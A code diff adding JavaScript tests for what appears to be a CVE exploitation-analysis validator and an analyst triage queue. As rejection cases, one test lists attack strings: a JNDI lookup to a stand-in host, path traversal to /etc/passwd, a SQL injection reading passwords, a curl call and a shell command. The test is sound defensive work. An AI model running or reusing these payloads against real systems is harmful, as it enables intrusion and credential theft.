@@ -51,3 +51,27 @@ test("tabletop: facts need sources, injects need time order", () => {
   const d = ex(); d.questions = ["one"];
   assert.ok(checkTabletop(d).some((m) => /questions/.test(m)));
 });
+
+test("exploitation analyses: complete records pass; code, payloads and attack commands are refused", async () => {
+  const { checkAnalysis } = await import("../../scripts/lib/validate.mjs");
+  const ok = { cve: "CVE-2026-1234", analyzed_at: "2026-11-19T04:00:00Z", model: "claude-opus-5-5", exploitation_status: "Exploited in the wild per CISA.",
+    how_exploited: "An unauthenticated attacker sends a crafted request to the management interface, which deserialises it and runs code as the service account.",
+    preconditions: ["Management interface reachable"], attack_path: ["Find an exposed interface", "Send a crafted request", "Run code"], exposure: "internet", who_is_exposed: [], detect: ["Unexpected child processes"],
+    remediation: { priority: "immediate", steps: ["Apply the fix"], fixed_versions: ["9.1.2"], workarounds: [], verify: ["Version shows 9.1.2"], if_compromised: [] }, confidence: "high", caveats: "",
+    sources: [{ name: "Vendor advisory", url: "https://vendor.example/sa/1", kind: "vendor", read_depth: "full" }, { name: "Researcher write-up", url: "https://lab.example/blog/x", kind: "research", read_depth: "full" }] };
+  assert.deepEqual(checkAnalysis(ok, "CVE-2026-1234"), []);
+  const bad = (path, val) => { const x = JSON.parse(JSON.stringify(ok)); path(x, val); return checkAnalysis(x, "CVE-2026-1234").length > 0; };
+  for (const v of ["curl -X POST https://x.example/api", "GET /admin/../../etc/passwd", "payload: AAAA", "${jndi:ldap://x.example/a}", "run `id` on the host", "' UNION SELECT password FROM users", "/bin/sh -c id", "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"])
+    assert.ok(bad((x, s) => { x.attack_path = [s]; }, v), v);
+  assert.ok(bad((x) => { x.sources = [x.sources[1], { ...x.sources[1], url: "https://lab.example/2" }]; }), "needs a vendor or government source");
+  assert.ok(bad((x) => { x.remediation.steps = []; }), "needs remediation steps");
+  assert.ok(bad((x) => { x.cve = "CVE-2026-9999"; }), "file name must match");
+});
+
+test("analyst queue: newest additions and near deadlines first; analysed flaws leave the queue", async () => {
+  const { queue } = await import("../../scripts/analyst.mjs");
+  const today = new Date().toISOString().slice(0, 10), d = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
+  const kev = [{ cve: "CVE-2026-0001", added: d(-30), due: d(-9) }, { cve: "CVE-2026-0002", added: d(-1), due: d(20) }, { cve: "CVE-2026-0003", added: d(-10), due: d(2) }, { cve: "CVE-2026-0004", added: d(-2), due: d(19), ransomware: true }];
+  assert.deepEqual(queue(kev, [], {}, today).map((x) => x.cve), ["CVE-2026-0004", "CVE-2026-0002", "CVE-2026-0003", "CVE-2026-0001"]);
+  assert.deepEqual(queue(kev, [], { "CVE-2026-0004": { analyzed_at: new Date().toISOString() } }, today).map((x) => x.cve).includes("CVE-2026-0004"), false);
+});
